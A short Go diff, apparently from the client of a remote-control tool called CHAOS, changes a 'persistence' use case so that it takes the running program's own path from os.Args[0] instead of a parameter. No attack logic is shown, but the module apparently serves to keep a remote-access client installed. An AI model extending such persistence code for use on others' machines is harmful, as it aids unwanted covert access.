@@ -10,6 +10,7 @@ import (
 	"github.com/tiagorlampert/CHAOS/client/app/util"
 	"github.com/tiagorlampert/CHAOS/client/app/util/network"
 	"net"
+	"os"
 )
 
 type PersistenceUseCase struct {
@@ -17,10 +18,10 @@ type PersistenceUseCase struct {
 	BinaryPath string
 }
 
-func NewPersistenceUseCase(conn net.Conn, binaryPath string) usecase.Persistence {
+func NewPersistenceUseCase(conn net.Conn) usecase.Persistence {
 	return &PersistenceUseCase{
 		Connection: conn,
-		BinaryPath: binaryPath,
+		BinaryPath: os.Args[0],
 	}
 }
 
